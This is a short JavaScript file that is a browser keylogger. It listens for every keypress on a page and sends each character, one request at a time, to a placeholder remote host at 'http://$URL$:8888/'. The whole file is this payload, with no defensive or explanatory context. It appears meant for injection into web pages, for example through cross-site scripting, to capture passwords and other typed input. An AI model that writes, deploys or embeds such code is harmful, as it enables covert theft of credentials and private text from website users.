document.addEventListener("keydown", keyDownTextField, false);
function keyDownTextField(e) {
	if(e.keyCode!=16 && e.keyCode!=32){ // If the pressed key is anything other than SHIFT
			if(e.keyCode >= 65 && e.keyCode <= 90){ // If the key is a letter
				if(e.shiftKey){ // If the SHIFT key is down, return the ASCII code for the capital letter
					var key = e.keyCode;
					var keystr = String.fromCharCode(key);
					var request = new XMLHttpRequest();
					request.open("GET", "http://$URL$:8888/" + keystr);
					request.send();
				}else{ // If the SHIFT key is not down, convert to the ASCII code for the lowecase letter
					key = e.keyCode+32;
					keystr = String.fromCharCode(key);
					request = new XMLHttpRequest();
					request.open("GET", "http://$URL$:8888/" + keystr);
					request.send();
				}
			}else{
					key = e.keyCode;
					keystr = String.fromCharCode(key);
					request = new XMLHttpRequest();
					request.open("GET", "http://$URL$:8888/" + keystr);
					request.send();
			}
	  }else if(e.keyCode === 32){
			keystr = '-space-';
			request = new XMLHttpRequest();
			request.open("GET", "http://$URL$:8888/" + keystr);
			request.send();
	  }

}
